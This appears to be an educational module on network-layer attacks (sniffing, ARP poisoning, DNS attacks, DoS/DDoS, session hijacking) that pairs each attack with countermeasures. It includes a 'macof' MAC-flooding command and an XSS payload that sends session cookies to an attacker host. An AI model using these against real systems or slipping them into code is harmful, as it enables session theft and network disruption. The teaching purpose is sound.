Network Level Attacks and Countermeasures

Network-layer attacks target the protocols and infrastructure that underpin all digital communication. From passive eavesdropping to volumetric denial-of-service campaigns, attackers exploit protocol design weaknesses, implementation flaws, and configuration errors to intercept, manipulate, and disrupt network traffic at scale.

Section 01

🔌 Packet Sniffing

Packet sniffing is the practice of capturing and analyzing network traffic as it traverses a network segment. In legitimate contexts, network engineers use sniffing tools (Wireshark, tcpdump) for troubleshooting and performance analysis. In adversarial contexts, attackers use sniffing to capture unencrypted credentials, session tokens, and sensitive data transmitted in cleartext.

👁 Passive Sniffing

  • ▸No traffic injection — observe only
  • ▸Works on hub-based or shared media networks
  • ▸All traffic visible on same collision domain
  • ▸Virtually undetectable — generates no traffic
  • ▸Less effective on switched networks

🚀 Active Sniffing

  • ▸Injects traffic to redirect packets to sniffer
  • ▸Required on switched networks (unicast traffic)
  • ▸Techniques: ARP spoofing, MAC flooding, DHCP attacks
  • ▸Detectable via anomaly monitoring
  • ▸Enables full MITM interception
ℹ
Promiscuous Mode
By default, a NIC only passes frames addressed to its own MAC address up to the OS. In promiscuous mode, the NIC accepts and passes all frames it sees on the wire, regardless of destination MAC. Sniffing tools (Wireshark, tcpdump) enable promiscuous mode automatically. Detection can be performed by sending packets with bogus destination MACs and checking which hosts respond — only hosts in promiscuous mode would process them.

MAC Flooding

MAC flooding exploits the CAM (Content Addressable Memory) table in network switches. Switches maintain a MAC-to-port mapping table with finite capacity. When an attacker floods the switch with frames containing thousands of fake source MAC addresses, the CAM table overflows. Once full, the switch enters fail-open mode, broadcasting all traffic to all ports — effectively converting it into a hub and enabling passive sniffing on a switched network.

# macof tool — MAC flooding (included in dsniff suite) $ sudo macof -i eth0 -n 100000 # Legitimate monitoring: detect CAM overflow via syslog alerts # Countermeasure: port security — limit MAC addresses per switch port Switch(config-if)# switchport port-security maximum 2 Switch(config-if)# switchport port-security violation restrict
Section 02

☢ ARP Poisoning

The Address Resolution Protocol (ARP) maps IP addresses to MAC addresses within a local network segment. ARP is a stateless, trust-based protocol — it accepts replies without verifying whether a request was made, and it has no authentication mechanism. This fundamental design weakness enables ARP cache poisoning attacks.

In an ARP poisoning attack, the attacker sends gratuitous ARP replies that map the attacker's MAC address to a victim's IP address (typically the default gateway). Both the victim and the gateway cache these false mappings, causing traffic destined for the gateway to be sent to the attacker instead. The attacker can then forward traffic to the real gateway (enabling transparent interception) or drop it (causing a denial of service).

ARP POISONING FLOW
Normal: Victim IP: 192.168.1.10 → ARP: Who has .1? Gateway: MAC aa:bb:cc
↓ attacker sends gratuitous ARP
Poisoned: Attacker MAC: de:ad:be:ef → ".1 is at de:ad:be:ef" Victim ARP Cache (corrupted)
↓ victim traffic now flows through attacker
Result: Victim → Attacker (MITM) → Gateway / Internet
☢
MITM via ARP Poisoning
Once positioned as a Man-in-the-Middle, the attacker can perform SSL stripping (downgrade HTTPS to HTTP to capture cleartext credentials), session token theft, credential injection, and traffic modification. Tools: arpspoof (dsniff), Ettercap, Bettercap, Scapy.

ARP Attack Countermeasures

  • Dynamic ARP Inspection (DAI) on managed switches — validates ARP packets against a DHCP snooping binding table
  • Static ARP entries for critical hosts (gateways, servers) that cannot be overwritten by gratuitous replies
  • Network monitoring tools (ArpWatch, XArp) that alert on ARP table changes
  • VPN and end-to-end encryption ensure that even intercepted traffic cannot be read
  • 802.1X port-based authentication restricts which devices can connect to switch ports
Section 03

🌏 DNS Attacks

The Domain Name System is the internet's phone book — translating human-readable hostnames into IP addresses. Because DNS underpins virtually all internet communication, attacks against it can silently redirect users to malicious infrastructure at scale without requiring any compromise of the target application or endpoint.

🏞
DNS Spoofing
Attacker intercepts a DNS query in transit (via MITM) and returns a forged response mapping the requested hostname to a malicious IP. The victim resolves the domain to the attacker's server. Effective without prior cache compromise.
In-Transit
💾
DNS Cache Poisoning
Corrupts a recursive DNS resolver's cache by injecting forged records before the legitimate response arrives. The Kaminsky attack (2008) demonstrated a practical method using birthday-paradox probability to guess transaction IDs within minutes.
Cache-Level
📈
DNS Amplification
Reflection/amplification DDoS using open DNS resolvers. Attacker sends small queries with spoofed source IP (victim's address) to open resolvers. Resolver returns large responses (DNSSEC, ANY records) to the victim — amplification ratios up to 50-70x.
DDoS Vector
⛰
DNS Tunneling
Encodes data within DNS queries and responses to exfiltrate data or establish C2 communication channels that bypass firewall rules. DNS is rarely blocked outbound. Tools: dnscat2, iodine. Detected by monitoring query volume and encoded domain names.
Exfiltration
✓
DNS Countermeasures
DNSSEC (DNS Security Extensions) adds cryptographic signatures to DNS records, allowing resolvers to verify authenticity. DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt DNS traffic to prevent in-transit manipulation. Organizations should also disable open recursive resolvers and implement response rate limiting (RRL) to prevent amplification attacks.
Section 04

💥 Denial of Service (DoS) Attacks

Denial of Service attacks aim to make a target system, service, or network unavailable to its intended users. Unlike data breach attacks that seek access, DoS attacks seek disruption — exhausting resources (bandwidth, CPU, memory, connection tables) until the target cannot service legitimate requests.

Attack Protocol Mechanism Target Resource
SYN Flood TCP Sends mass SYN packets without completing 3-way handshake; half-open connections fill the backlog queue Connection table, CPU
UDP Flood UDP Sends high-volume UDP datagrams to random ports; target exhausts CPU responding with ICMP Port Unreachable Bandwidth, CPU
ICMP Flood (Ping Flood) ICMP Overwhelms target with Echo Request packets faster than it can process and reply Bandwidth, CPU
Smurf Attack ICMP Sends ICMP Echo Requests to broadcast address with spoofed source = victim; all hosts on subnet reply to victim Bandwidth (amplified)
Ping of Death ICMP Sends malformed, oversized ICMP packets (>65,535 bytes) that cause buffer overflow or crash on reassembly Memory, stability
HTTP Flood HTTP Sends legitimate-looking GET/POST requests at scale; bypasses network-layer filters; targets application layer Web server, CPU
Slowloris HTTP Opens many connections and sends partial HTTP headers very slowly; keeps connections open, exhausting thread pool Connection pool
ℹ
SYN Cookie Countermeasure
SYN cookies are a server-side defense against SYN floods. Instead of allocating connection state on receipt of a SYN packet, the server encodes connection parameters into the TCP Initial Sequence Number (ISN) as a cryptographic cookie. State is only allocated when the client completes the handshake with a valid ACK, making SYN floods computationally inexpensive to absorb. Enabled via: sysctl net.ipv4.tcp_syncookies=1
Section 05

🌐 Distributed Denial of Service (DDoS)

DDoS attacks distribute the attack load across thousands or millions of compromised systems (botnets), making source-based filtering impractical and generating traffic volumes that can overwhelm even enterprise-grade network infrastructure. Modern DDoS attacks frequently exceed 1 Tbps — volumes that can saturate upstream ISP links.

🤖
Botnets
Networks of compromised devices (bots/zombies) controlled by a C2 (Command and Control) server. The botmaster issues flood commands; bots execute them simultaneously. Mirai botnet (2016) leveraged IoT devices to generate 1.2 Tbps against Dyn DNS, taking major platforms offline across the US east coast.
Infrastructure
📈
Amplification Attacks
Use intermediary servers (open DNS resolvers, NTP servers, memcached) with spoofed source IPs to amplify traffic volume. DNS amplification: 40-70x. NTP monlist amplification: up to 556x. Memcached UDP amplification: up to 51,000x (record: 1.7 Tbps).
Reflection
💰
DDoS-as-a-Service
"Stresser" or "booter" services offer DDoS capability on a subscription basis — no technical expertise required. Attackers can rent 100 Gbps+ attack capacity for as little as $20-100/month, dramatically lowering the barrier to entry for volumetric attacks against businesses and infrastructure.
Commoditized

DDoS Countermeasures

  • Upstream Scrubbing Centers — Cloud-based scrubbing services (Cloudflare, Akamai, AWS Shield) absorb volumetric attacks before they reach the origin
  • Anycast Diffusion — Distributes traffic across global PoPs so no single location is overwhelmed
  • Rate Limiting and ACLs — Block known bad source IPs and rate-limit suspicious traffic patterns at the network edge
  • BGP Blackholing — Instruct upstream ISPs to null-route attack traffic before it enters your network (sacrifices availability to protect infrastructure)
  • BCP38 (Ingress Filtering) — ISP-level filtering that blocks spoofed source addresses, preventing reflection/amplification attacks
Section 06

🔨 Session Hijacking

Session hijacking involves taking over an authenticated user session by stealing or predicting the session identifier. Rather than compromising credentials, the attacker hijacks the post-authentication state — gaining access to the application as the legitimate user without needing their password.

🔎
Session ID Prediction
Exploiting weak session token generation
▼

If session IDs are generated using predictable algorithms (sequential numbers, timestamps, weak PRNGs), an attacker can collect multiple session tokens and identify the pattern to predict valid tokens for other active sessions. Countermeasure: use cryptographically secure PRNGs with sufficient entropy (128+ bits) for session ID generation.

🤔
XSS-Based Session Theft
Cross-site scripting to steal session cookies
▼

Stored or reflected XSS vulnerabilities enable attackers to inject JavaScript that reads document.cookie and exfiltrates the session token to an attacker-controlled server.

// XSS payload to steal session cookie <script> new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie); </script> // Countermeasure: HttpOnly flag prevents JS access to cookies Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
🔌
TCP Session Hijacking
Network-layer session takeover
▼

TCP session hijacking exploits the stateful nature of TCP connections. The attacker, positioned as a MITM (via ARP poisoning), monitors a TCP session and predicts sequence numbers. By injecting a forged TCP segment with the correct sequence number before the legitimate response arrives, the attacker can inject arbitrary commands or data into the session. The Juggernaut and Hunt tools implement this attack. Countermeasure: TLS encryption renders hijacked TCP segments unreadable and sequence injection detectable.

💯
Session Desynchronization
Breaking the client-server TCP state
▼

In this variant, the attacker causes the server and client to lose TCP synchronization by injecting RST packets or forged data. Once desynchronized, the attacker takes over the session by responding to the server as if they were the legitimate client. The legitimate client, confused by the unexpected sequence numbers, drops the connection, leaving the attacker in control.

Section 07

🛡 Network Attack Countermeasures

🔒
Encryption
TLS 1.3 for all application traffic. VPNs and IPsec for site-to-site and remote access. Makes sniffed traffic unintelligible and prevents MITM data injection.
Layer 3-7
💻
IDS / IPS
Network Intrusion Detection/Prevention Systems inspect traffic for attack signatures and anomalies. Snort, Suricata (open-source); commercial: Palo Alto, Cisco Firepower. IPS actively blocks malicious flows.
Inline Defense
📈
Rate Limiting
Per-source rate limits on routers and firewalls constrain the impact of flood attacks. SYN rate limiting, ICMP rate limiting, and connection rate limits protect server resources without full blacklisting.
Traffic Control
🔥
Packet Filtering
Stateful firewall rules block spoofed source addresses (RFC 2827/BCP38), unwanted protocols, and access to unused ports. ACLs on routers limit attack surface at the network perimeter.
Perimeter
🔌
Dynamic ARP Inspection
Managed switch feature that validates ARP packets against the DHCP snooping binding table. ARP packets with MAC/IP mappings inconsistent with the table are dropped, preventing ARP cache poisoning.
Layer 2
🔎
Network Monitoring
NetFlow/IPFIX analysis, SIEM correlation, and baseline deviation alerts catch DDoS buildup, port scan sweeps, and unusual traffic patterns before they cause significant damage.
Visibility
Section 08

⚡ Key Takeaways

🔌
Protocols Were Not Built for Adversaries
ARP, DNS, and TCP were designed for cooperative environments. Their lack of authentication creates exploitable trust assumptions that persist in modern networks.
🔒
Encryption Neutralizes Most MITM Attacks
TLS with certificate pinning and HSTS eliminates the value of most sniffing and session hijacking attacks. Encryption is not optional — it is foundational.
💥
DoS Is an Availability Problem
Defense requires upstream capacity (CDN, scrubbing centers), not just local mitigations. No firewall can stop 1 Tbps if your upstream link is only 10 Gbps.
📄
Defense in Depth
Layer 2 controls (DAI, port security), Layer 3 filtering (BCP38, ACLs), Layer 7 inspection (WAF, IPS), and monitoring must work together. Single-layer defenses fail against multi-vector attacks.

  • 03 Session tokens protected with the HttpOnly and Secure cookie flags cannot be stolen via XSS. However, session hijacking can still occur via network-level sniffing. Describe a complete session security architecture for a high-value web application that addresses both attack vectors.
  • 04 Slowloris attacks are effective against servers using thread-per-connection models but largely ineffective against event-driven servers (nginx, Node.js). How does server architecture influence vulnerability to application-layer DoS attacks, and what configuration changes would you recommend?
  • 05 DNS cache poisoning was largely addressed by randomizing source ports (TXID randomization) following Kaminsky's 2008 disclosure. What threat model assumptions underpin DNSSEC adoption, and why has DNSSEC deployment remained incomplete despite a known and critical vulnerability class?
